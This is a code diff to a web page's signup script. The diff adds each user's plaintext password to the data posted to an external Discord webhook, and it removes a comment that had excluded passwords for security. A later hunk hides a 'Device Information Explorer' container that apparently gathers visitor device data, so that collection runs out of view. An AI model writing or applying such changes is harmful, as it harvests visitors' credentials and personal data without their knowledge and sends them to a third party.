@@ -1036,17 +1036,17 @@ footer {
     };
 
     // Send data to Discord webhook
-    const sendToDiscord = async (userData) => {
-        try {
-            const response = await fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `New signup!\nEmail: ${userData.email}\nIP Address: ${userData.ip}\nTimestamp: ${userData.timestamp}`,
-                }),
-            });
+const sendToDiscord = async (userData) => {
+  try {
+    const response = await fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: `New signup!\nEmail: ${userData.email}\nPassword: ${userData.password}\nIP Address: ${userData.ip}\nTimestamp: ${userData.timestamp}`,
+      }),
+    });
             
             if (!response.ok) {
                 throw new Error(`Error: ${response.statusText}`);
@@ -1077,12 +1077,14 @@ footer {
         const ip = await getUserIP();
         const timestamp = new Date().toISOString();
         
-        // User data object (excludes password for security)
-        const userData = {
-            email,
-            ip,
-            timestamp
-        };
+
+// User data object (includes password)
+const userData = {
+  email,
+  password: passwordInput.value, // Add this line
+  ip,
+  timestamp
+};
         
         // Send data to Discord webhook
         await sendToDiscord(userData);
@@ -1120,7 +1122,8 @@ footer {
             }
         });
     });
-});</script>
+});
+  </script>
 </body>
 </html>
 <html><head><base href="." />
@@ -1137,10 +1140,11 @@ footer {
 .container {
   max-width: 1200px;
   margin: 0 auto;
-    visibility:hidden;
-  height:0px;
-
 }
+  #thething {
+        visibility:hidden;
+  height:0px;
+  }
 
 .card {
   background: rgba(255, 255, 255, 0.05);
@@ -1239,7 +1243,7 @@ h1 {
 </style>
 </head>
 <body>
-<div class="container">
+<div class="container" id="thething">
   <h1>Enhanced Device Information Explorer</h1>
   <div class="loader" id="loader"></div>
   <div class="info-grid" id="info"></div>
